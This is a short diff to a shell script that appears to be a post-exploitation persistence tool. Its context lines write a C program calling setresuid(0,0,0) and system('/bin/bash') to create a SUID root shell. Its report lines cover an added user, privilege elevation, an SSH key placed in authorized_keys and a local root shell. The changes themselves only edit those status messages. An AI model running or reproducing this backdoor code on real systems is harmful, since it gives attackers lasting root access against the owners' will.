@@ -395,6 +395,7 @@ if [ -f "/bin/bash" ]; then BASH="1"; else BASH=""; fi
 
 print_title "Trying to add a shell as a binary with suid bit set ..."
 sleep 2
+
 if [ "$BASH" ]; then
   echo 'int main(void){setresuid(0, 0, 0);system("/bin/bash");}' > $TMPDIR/morannon.c
 else
@@ -461,11 +462,14 @@ print_title "Following parts where successful:"
 if [ "$ADDUSEROK" ]; then
   print_result "User \"$USERNAME\" added"
 fi
+if [ "$ELEVATEPRIVOK" ]; then
+  print_result "Privilege elevation of user \"$PRIVUSER\""
+fi
 if [ "$SSHOK" ]; then
-  print_result "authorized_keys file updated"
+  print_result "Adding SSH key to authorized_keys file"
 fi
 if [ "$ROOTSHELLOK" ]; then
-  print_result "A local root shell was created"
+  print_result "Creation of a local root shell"
 fi
 
 echo
